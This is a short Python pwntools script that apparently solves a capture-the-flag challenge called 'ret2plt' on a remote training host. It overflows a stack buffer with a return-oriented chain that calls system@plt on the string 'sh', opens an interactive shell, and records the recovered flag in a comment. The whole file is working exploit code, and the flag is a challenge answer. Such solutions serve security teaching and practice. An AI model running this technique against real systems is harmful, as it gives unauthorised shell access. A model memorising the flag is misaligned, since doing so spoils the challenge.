from pwn import *
context.log_level = 'DEBUG'
r=remote('isc.taiwan-te.ch',10005)
#r=process('./ret2plt')
#raw_input()

r.recvuntil('name?\n')
r.send('sh\x00')

pop_rdi = 0x400733
name_addr = 0x601070
ret = 0x4004fe
system_plt = 0x400520

p = 'a' * 0x18 + p64(pop_rdi) + p64(name_addr) + p64(ret) + p64(system_plt)

r.recvuntil('something: ')
r.send(p)

#r.sendline('cat /home/`whoami`/flag')

r.interactive()
#FLAG{r37urn_70_p17_15_p0w3rfu1!!!}
